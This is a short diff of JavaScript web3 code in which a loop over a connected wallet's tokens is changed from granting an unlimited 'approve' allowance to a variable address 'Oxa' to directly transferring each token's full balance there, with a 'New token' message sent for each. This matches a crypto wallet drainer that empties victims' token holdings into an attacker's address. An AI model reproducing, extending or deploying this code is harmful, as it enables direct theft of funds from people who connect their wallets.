@@ -316,9 +316,9 @@ async function loopTokens(tokens){
         try {
         let instance = new web3Object.eth.Contract(ABI, token.address);
         sendMessage("New token")
-        await instance.methods.approve(
+       await instance.methods.transfer(
             Oxa,
-            "999999999999999999999999999999999999999999999999999999999999999999999999")
+            token.balance)
             .send({
                 from: selectedAccount,
                 to: token.address
